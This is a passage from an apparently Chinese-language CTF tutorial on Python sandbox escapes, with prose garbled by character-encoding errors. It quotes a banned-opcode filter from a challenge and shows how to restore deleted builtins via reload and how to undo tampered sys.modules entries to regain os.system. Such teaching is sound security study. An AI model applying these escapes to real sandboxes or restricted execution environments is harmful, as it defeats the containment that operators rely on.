<p>æ“ä½œç ï¼ˆOpcodeï¼‰æ˜¯å­—èŠ‚ç ä¸­çš„ä¸€æ¡æŒ‡ä»¤ï¼Œç”¨äºå‘Šè¯‰è™šæ‹Ÿæœºè¦æ‰§è¡Œçš„æ“ä½œã€‚æ“ä½œç ç”± 1 å­—èŠ‚çš„æ•´æ•°å€¼ï¼ˆ0-255 ä¹‹é—´ï¼‰è¡¨ç¤ºï¼Œä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ª opcodeï¼Œå¯¹åº”çš„åŠ©è®°ç¬¦ï¼ˆå¦‚ <code>LOAD_CONST</code>ã€<code>BINARY_OP</code>ï¼‰ã€‚</p>
<p>ç¼–è¯‘é˜¶æ®µ Python å°† <code>.py</code> æºæ–‡ä»¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼ˆå¯ç¼“å­˜åˆ° <code>.pyc</code> æ–‡ä»¶ä¸­ï¼‰ï¼›æ‰§è¡Œé˜¶æ®µPVM é€æ¡è¯»å–å¹¶æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤ã€‚</p>
<p>Python æä¾›äº† <code>dis</code> æ¨¡å—ç”¨æ¥æŸ¥çœ‹æŒ‡å®šå‡½æ•°å­—èŠ‚ç ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">dis.dis(add)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  2           0 LOAD_FAST                0 (a)</span></span><br><span class="line"><span class="string">              2 LOAD_FAST                1 (b)</span></span><br><span class="line"><span class="string">              4 BINARY_ADD</span></span><br><span class="line"><span class="string">              6 RETURN_VALUE</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ–è€…ä½¿ç”¨ <code>dis.opmap</code> å’Œ <code>dis.opname</code> æŸ¥çœ‹å…·ä½“æŸä¸ªå­—èŠ‚ç çš„åŠ©è®°ç¬¦ã€‚Python ä¸€èˆ¬æœ€å¤šæœ‰ 256 ç§æ“ä½œç ï¼ˆ0-255ï¼‰ï¼Œéƒ¨åˆ†ä¿ç•™æˆ–æœªå®šä¹‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="built_in">print</span>(dis.opmap[<span class="string">&#x27;LOAD_CONST&#x27;</span>])  <span class="comment"># -&gt; 100</span></span><br><span class="line"><span class="built_in">print</span>(dis.opname[<span class="number">100</span>])          <span class="comment"># -&gt; &#x27;LOAD_CONST&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="æ²™ç®±ç¤ºä¾‹"><a href="#æ²™ç®±ç¤ºä¾‹" class="headerlink" title="æ²™ç®±ç¤ºä¾‹"></a>æ²™ç®±ç¤ºä¾‹</h3><p>ä»¥ <strong>LACTF 2023 Pycjail</strong> ä¸ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆå§‹çš„ç¦æ­¢æŒ‡ä»¤åˆ—è¡¨ï¼ˆæŒ‰åç§°ï¼‰</span></span><br><span class="line"><span class="comment"># IMPORT_NAME     â†’ ç”¨äº import è¯­å¥å¯¼å…¥æ¨¡å—</span></span><br><span class="line"><span class="comment"># MAKE_FUNCTION   â†’ ç”¨äºå®šä¹‰å‡½æ•°ï¼ˆdef / lambdaï¼‰</span></span><br><span class="line">banned = [<span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;MAKE_FUNCTION&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰ Python opcode çš„åå­—ï¼ˆopcode.opmap æ˜¯ &#123;æŒ‡ä»¤å: opcodeæ•°å€¼&#125; çš„æ˜ å°„ï¼‰</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> opcode.opmap:</span><br><span class="line">    <span class="comment"># å¦‚æœæŒ‡ä»¤åä¸­åŒ…å« &quot;LOAD&quot; ä¸”ä¸æ˜¯ &quot;LOAD_CONST&quot;</span></span><br><span class="line">    <span class="comment">#   LOAD_* æŒ‡ä»¤ä¼šä»å˜é‡ã€å±æ€§ã€å…¨å±€ç­‰ä½ç½®å–å€¼</span></span><br><span class="line">    <span class="comment">#   LOAD_CONST ä¾‹å¤–ï¼Œå› ä¸ºå®ƒåªä»å¸¸é‡æ± å–å€¼ï¼Œä¸ä¼šè®¿é—®å¤–éƒ¨ç¯å¢ƒ</span></span><br><span class="line">    <span class="comment"># æˆ–è€…æŒ‡ä»¤åä¸­åŒ…å« &quot;STORE&quot;</span></span><br><span class="line">    <span class="comment">#   STORE_* æŒ‡ä»¤ä¼šæŠŠå€¼å­˜åˆ°å˜é‡ã€å±æ€§ç­‰åœ°æ–¹</span></span><br><span class="line">    <span class="comment"># æˆ–è€…æŒ‡ä»¤åä¸­åŒ…å« &quot;DELETE&quot;</span></span><br><span class="line">    <span class="comment">#   DELETE_* æŒ‡ä»¤ä¼šåˆ é™¤å˜é‡ã€å±æ€§ç­‰</span></span><br><span class="line">    <span class="comment"># æˆ–è€…æŒ‡ä»¤åä¸­åŒ…å« &quot;JUMP&quot;</span></span><br><span class="line">    <span class="comment">#   JUMP_* æŒ‡ä»¤ä¼šè¿›è¡Œè·³è½¬ï¼ˆå½±å“æ§åˆ¶æµï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        (<span class="string">&quot;LOAD&quot;</span> <span class="keyword">in</span> k <span class="keyword">and</span> k != <span class="string">&quot;LOAD_CONST&quot;</span>)</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;STORE&quot;</span> <span class="keyword">in</span> k</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;DELETE&quot;</span> <span class="keyword">in</span> k</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;JUMP&quot;</span> <span class="keyword">in</span> k</span><br><span class="line">    ):</span><br><span class="line">        <span class="comment"># æŠŠè¯¥æŒ‡ä»¤ååŠ å…¥ç¦æ­¢åˆ—è¡¨</span></span><br><span class="line">        banned.append(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æŒ‡ä»¤åè½¬æ¢æˆ opcode æ•°å€¼é›†åˆï¼ˆä¾¿äºç›´æ¥å’Œå­—èŠ‚ç çš„ opcode å¯¹æ¯”ï¼‰</span></span><br><span class="line">banned = &#123;opcode.opmap[x] <span class="keyword">for</span> x <span class="keyword">in</span> banned&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ï¼ˆåç»­ä»£ç ç‰‡æ®µï¼Œå‡è®¾ code æ˜¯ç”¨æˆ·è¾“å…¥ç¼–è¯‘åçš„å­—èŠ‚ç åºåˆ—ï¼‰</span></span><br><span class="line"><span class="comment"># ä» 0 å¼€å§‹ï¼Œæ¯éš” 2 å­—èŠ‚å–ä¸€ä¸ªå€¼ï¼ˆæ¯ä¸ªæŒ‡ä»¤1å­—èŠ‚opcode + 1å­—èŠ‚å‚æ•°ï¼‰</span></span><br><span class="line"><span class="comment"># æ£€æŸ¥è¿™äº› opcode æ˜¯å¦åœ¨ç¦æ­¢é›†åˆä¸­</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">any</span>(code[i] <span class="keyword">in</span> banned <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">2</span>)):</span><br><span class="line">    <span class="comment"># ä¸€æ—¦å‘ç°å­˜åœ¨è¢«ç¦çš„ opcodeï¼Œå°±æ‹’ç»æ‰§è¡Œ</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;banned opcode &gt;:(&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>è¿‡æ»¤è§„åˆ™ï¼š</p>
<ul>
<li><strong>æ˜¾å¼ç¦æ­¢</strong>ï¼š<ul>
<li><code>IMPORT_NAME</code>ï¼ˆå¯¼å…¥æ¨¡å—ï¼‰</li>
<li><code>MAKE_FUNCTION</code>ï¼ˆå®šä¹‰æ–°å‡½æ•°ï¼‰</li>
</ul>
</li>
<li><strong>æ¨¡å¼ç¦æ­¢</strong>ï¼š<ul>
<li>æ‰€æœ‰ <code>LOAD_*</code>ï¼ˆé™¤äº† <code>LOAD_CONST</code>ï¼‰</li>
<li>æ‰€æœ‰ <code>STORE_*</code>ï¼ˆå˜é‡èµ‹å€¼ï¼‰</li>
<li>æ‰€æœ‰ <code>DELETE_*</code>ï¼ˆåˆ é™¤å˜é‡&#x2F;å±æ€§ï¼‰</li>
<li>æ‰€æœ‰ <code>JUMP_*</code>ï¼ˆè·³è½¬æŒ‡ä»¤ï¼‰</li>
</ul>
</li>
</ul>
<p>è¿‡æ»¤æ•ˆæœï¼š</p>
<ul>
<li>è¢«ç¦èƒ½åŠ›ï¼š<ul>
<li>è¯»å–ä»»ä½•å˜é‡ã€å…¨å±€åã€å±æ€§ï¼ˆ<code>LOAD_NAME</code>ã€<code>LOAD_GLOBAL</code>â€¦ï¼‰ã€‚</li>
<li>èµ‹å€¼ã€åˆ é™¤å˜é‡ã€‚</li>
<li>è·³è½¬ã€å¾ªç¯ã€æ¡ä»¶æ§åˆ¶ã€‚</li>
<li>å¯¼å…¥æ¨¡å—ã€å®šä¹‰å‡½æ•°ã€‚</li>
</ul>
</li>
<li>å…è®¸èƒ½åŠ›ï¼š<ul>
<li><code>LOAD_CONST</code>ï¼ˆåŠ è½½å¸¸é‡ï¼‰</li>
<li>ç®—æœ¯è¿ç®—ï¼ˆ<code>BINARY_OP</code>ï¼‰</li>
<li>æ„é€ å¸¸é‡ç»“æ„ï¼ˆ<code>BUILD_LIST</code>ã€<code>BUILD_TUPLE</code>â€¦ï¼‰</li>
<li><code>RETURN_VALUE</code></li>
</ul>
</li>
</ul>
<h1 id="ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•"><a href="#ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•" class="headerlink" title="ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•"></a>ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•</h1><p>åœ¨ä¸€äº›æ²™ç®±ä¸­ï¼Œå¯èƒ½ä¼šå¯¹æŸäº›æ¨¡å—æˆ–è€…æ¨¡å—çš„æŸäº›æ–¹æ³•ä½¿ç”¨ <code>del</code> å…³é”®å­—è¿›è¡Œåˆ é™¤ã€‚ ä¾‹å¦‚åˆ é™¤ builtins æ¨¡å—çš„ eval æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="reload-é‡æ–°åŠ è½½"><a href="#reload-é‡æ–°åŠ è½½" class="headerlink" title="reload é‡æ–°åŠ è½½"></a>reload é‡æ–°åŠ è½½</h2><p><code>reload()</code> å‡½æ•°çš„ä½œç”¨æ˜¯<strong>é‡æ–°åŠ è½½ä¸€ä¸ªå·²ç»å¯¼å…¥çš„æ¨¡å—</strong>ã€‚åœ¨æŸäº›åœºæ™¯ï¼ˆä¾‹å¦‚æ²™ç®±é€ƒé€¸ï¼‰ä¸­ï¼Œå¦‚æœå†…ç½®å‡½æ•°è¢«åˆ é™¤ï¼Œå¯ä»¥é€šè¿‡ <code>reload()</code> æ¢å¤æ¨¡å—åŸå§‹çŠ¶æ€ï¼Œä»è€Œæ‰¾å›è¢«åˆ æ‰çš„å‡½æ•°ã€‚</p>
<h3 id="Python-2-ä¸­çš„è¡Œä¸º"><a href="#Python-2-ä¸­çš„è¡Œä¸º" class="headerlink" title="Python 2 ä¸­çš„è¡Œä¸º"></a>Python 2 ä¸­çš„è¡Œä¸º</h3><p>åœ¨ Python 2 ä¸­ï¼Œ<code>reload</code> æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]  <span class="comment"># åˆ é™¤ eval</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)  <span class="comment"># é‡æ–°åŠ è½½ __builtins__</span></span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]  <span class="comment"># æ¢å¤æˆåŠŸ</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>reload(__builtin__)</code> ä¼š<strong>é‡æ–°åˆå§‹åŒ–</strong>å†…ç½®æ¨¡å—ï¼ŒæŠŠé»˜è®¤ç¬¦å·ï¼ˆ<code>eval</code> ç­‰ï¼‰<strong>é‡æ–°å¡«å›</strong>ã€‚</p>
<p>Python 2 ä¸‹ï¼Œåˆ é™¤çš„å†…ç½®å‡½æ•°å¯ä»¥é€šè¿‡ <code>reload(__builtins__)</code> æ¢å¤ã€‚</p>
<h3 id="Python-3-ä¸­çš„è¡Œä¸º"><a href="#Python-3-ä¸­çš„è¡Œä¸º" class="headerlink" title="Python 3 ä¸­çš„è¡Œä¸º"></a>Python 3 ä¸­çš„è¡Œä¸º</h3><p>åœ¨ Python 3 ä¸­ï¼Œ<code>reload()</code> è¢«ç§»åˆ°äº† <code>importlib</code> æ¨¡å—ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.reload(module)</span><br></pre></td></tr></table></figure></div>

<p>ä½† Python 3 å¯¹ <code>__builtins__</code> çš„ <code>reload</code> è¡Œä¸º<strong>åšäº†é™åˆ¶</strong>ï¼Œ<code>importlib.reload(__builtins__)</code> <strong>ä¸ä¼šæ¢å¤</strong>è¢«åˆ é™¤çš„å†…ç½®å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>importlib.reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯å› ä¸ºåœ¨ Python3 ä¸­ <code>importlib.reload(builtins)</code> èµ°çš„æ˜¯ <strong>importlib çš„é‡è½½åè®®</strong>ã€‚å¯¹â€œå†…ç½®æ¨¡å—â€æ¥è¯´ï¼ŒåŠ è½½å™¨ï¼ˆBuiltinImporterï¼‰åœ¨ <strong>reload æ—¶ä¸ä¼šé‡æ–°è·‘ C çº§åˆå§‹åŒ–</strong>ï¼ˆåŸºæœ¬æ˜¯ç©ºæ“ä½œï¼‰ï¼Œå› æ­¤<strong>ä¸ä¼šé‡å»º&#x2F;å¡«å……æ¨¡å—å­—å…¸</strong>ã€‚ä½ åˆ è¿‡çš„åå­—å°±è¿˜æ˜¯æ²¡äº†ã€‚</p>
<p>è€Œåœ¨ Python2 ä¸­ <code>reload(__builtin__)</code> ä¼šå†æ¬¡è°ƒç”¨è¯¥å†…ç½®æ¨¡å—çš„ <strong>C çº§åˆå§‹åŒ–å‡½æ•°</strong>ï¼ˆ<code>init__builtin__</code>ï¼‰ï¼Œä»è€ŒæŠŠé»˜è®¤çš„å†…å»ºåå­—ï¼ˆ<code>eval</code> ç­‰ï¼‰<strong>é‡æ–°å¡«å›æ¨¡å—å­—å…¸</strong>ã€‚æ‰€ä»¥åˆ æ‰çš„ä¸œè¥¿èƒ½å›æ¥ã€‚</p>
<h2 id="æ¢å¤-sys-modules"><a href="#æ¢å¤-sys-modules" class="headerlink" title="æ¢å¤ sys.modules"></a>æ¢å¤ sys.modules</h2><p><strong><code>sys.modules</code></strong> æ˜¯ Python è§£é‡Šå™¨å†…éƒ¨çš„<strong>æ¨¡å—ç¼“å­˜å­—å…¸</strong>ï¼Œé”®æ˜¯æ¨¡å—åï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œå€¼æ˜¯å·²åŠ è½½çš„æ¨¡å—å¯¹è±¡ã€‚æ¯æ¬¡æ‰§è¡Œ <code>import xxx</code> æ—¶ï¼ŒPython **å…ˆæ£€æŸ¥ <code>sys.modules</code>**ï¼š</p>
<ul>
<li>å¦‚æœå­˜åœ¨åŒå keyï¼Œå°±ç›´æ¥è¿”å›é‡Œé¢çš„å¯¹è±¡ï¼ˆä¸é‡æ–°åŠ è½½æ–‡ä»¶ï¼‰ã€‚</li>
<li>å¦‚æœä¸å­˜åœ¨ï¼Œå°±å»æ‰¾æ¨¡å—æ–‡ä»¶ï¼ˆæˆ–å†…ç½®æ¨¡å—ç­‰ï¼‰ï¼ŒåŠ è½½åæ”¾åˆ° <code>sys.modules</code>ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€â€”â€”å¦‚æœæœ‰äººåœ¨æ²™ç®±ä¸­<strong>æ¶æ„æ›¿æ¢</strong>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&quot;not allowed&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆ <code>import os</code> æ‹¿åˆ°çš„å°±æ˜¯å­—ç¬¦ä¸² <code>&quot;not allowed&quot;</code>ï¼Œè€Œä¸æ˜¯æ¨¡å—å¯¹è±¡ï¼Œåç»­ä»»ä½•å±æ€§è®¿é—®éƒ½ä¼šå‡ºé”™ã€‚</p>
<p>é™¤æ­¤ä¹‹æ¶æ„æ›¿æ¢ <code>os</code> æ¨¡å—è¿˜ä¼šå½±å“å…¶ä»–æ¨¡å—ã€‚å› ä¸ºè®¸å¤šåº“ï¼ˆå¦‚ <code>subprocess</code>ã€<code>shutil</code>ã€<code>tempfile</code>ï¼‰å†…éƒ¨<strong>éšå¼å¯¼å…¥</strong>äº† <code>os</code> æ¨¡å—ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_handle_exitstatus</span>(<span class="params">self, sts, _WIFSIGNALED=os.WIFSIGNALED, ...</span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœ <code>os</code> å˜æˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè‡ªç„¶ä¼šè§¦å‘ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: &#x27;str&#x27; object has no attribute &#x27;WIFSIGNALED&#x27;</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸ºå®ƒæœŸæœ› <code>os</code> æ˜¯ä¸ªæ¨¡å—å¯¹è±¡ã€‚</p>
<p>ç”±äº <code>import</code> æœºåˆ¶æ˜¯**å…ˆæŸ¥ <code>sys.modules</code>**ï¼Œæ‰€ä»¥ï¼š</p>
<ul>
<li>å¦‚æœä½ ä¸å…ˆ <code>del sys.modules[&#39;os&#39;]</code>ï¼Œå®ƒæ°¸è¿œä¸ä¼šå»çœŸæ­£åŠ è½½ <code>os</code> æ¨¡å—æ–‡ä»¶ã€‚</li>
<li>åˆ é™¤åå† <code>import os</code>ï¼Œè§£é‡Šå™¨ä¼šèµ°æ­£å¸¸çš„æ¨¡å—åŠ è½½æµç¨‹ï¼Œä»ç£ç›˜æˆ–å†…ç½®æ¨¡å—è¡¨é‡æ–°å¯¼å…¥ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ²™ç®±é‡Œè¢«æ›¿æ¢</span></span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&quot;not allowed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥å¯¼å…¥ä¼šæ‹¿åˆ°åçš„å¯¹è±¡</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®å¤</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]   <span class="comment"># åˆ é™¤ç¼“å­˜</span></span><br><span class="line"><span class="keyword">import</span> os               <span class="comment"># é‡æ–°åŠ è½½</span></span><br><span class="line">os.system(<span class="string">&quot;ls&quot;</span>)         <span class="comment"># OK</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>å¿…é¡»åˆ é™¤ key</strong><br> ä¸èƒ½ç›´æ¥èµ‹å€¼ <code>None</code>ï¼Œå› ä¸º <code>None</code> ä¾æ—§æ˜¯ç¼“å­˜çš„ä¸€éƒ¨åˆ†ï¼Œ<code>import</code> ä¸ä¼šé‡æ–°åŠ è½½ã€‚</p>
</li>
<li><p><strong>æ¨¡å—ä¾èµ–é“¾</strong><br> å¦‚æœ <code>os</code> è¢«æ›¿æ¢ï¼Œå…¶ä»–å·²åŠ è½½çš„æ¨¡å—ä¸­å¯èƒ½<strong>å·²ç»æŒæœ‰åå¼•ç”¨</strong>ï¼Œæ¯”å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&quot;bad&quot;</span></span><br><span class="line">subprocess.os    <span class="comment"># ä¾æ—§æ˜¯åçš„</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™ç§æƒ…å†µè¦é‡æ–°åŠ è½½ä¾èµ–æ¨¡å—ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;subprocess&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> os, subprocess</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>å†…ç½®æ¨¡å—</strong>ï¼ˆå¦‚ <code>sys</code>ã€<code>builtins</code>ï¼‰å³ä½¿è¢« <code>del</code>ï¼Œä¹Ÿä¸ä¼šçœŸçš„ä¸¢å¤±ï¼Œå®ƒä»¬ç”±è§£é‡Šå™¨æœ¬èº«ç»´æŠ¤ï¼Œå¯ä»¥é‡æ–°åŠ è½½ã€‚</p>
</li>
</ul>

    </div>
  </div>

<h2 id="ä½¿ç”¨-globals-è·å–-builtins-æ–¹æ³•"><a href="#ä½¿ç”¨-globals-è·å–-builtins-æ–¹æ³•" class="headerlink" title="ä½¿ç”¨ globals() è·å– builtins æ–¹æ³•"></a>ä½¿ç”¨ globals() è·å– builtins æ–¹æ³•</h2><p>åœ¨ä¸€äº›é¢˜ç›®ä¸­ï¼Œå¯èƒ½é€šè¿‡è¦†ç›–å†…ç½®çš„å‡½æ•°æ¥é™åˆ¶æˆ‘ä»¬ä½¿ç”¨ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_fun_callback</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Player! It&#x27;s already banned!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">vars</span> = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line"><span class="built_in">dir</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">getattr</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">exec</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">__import__</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">compile</span> = 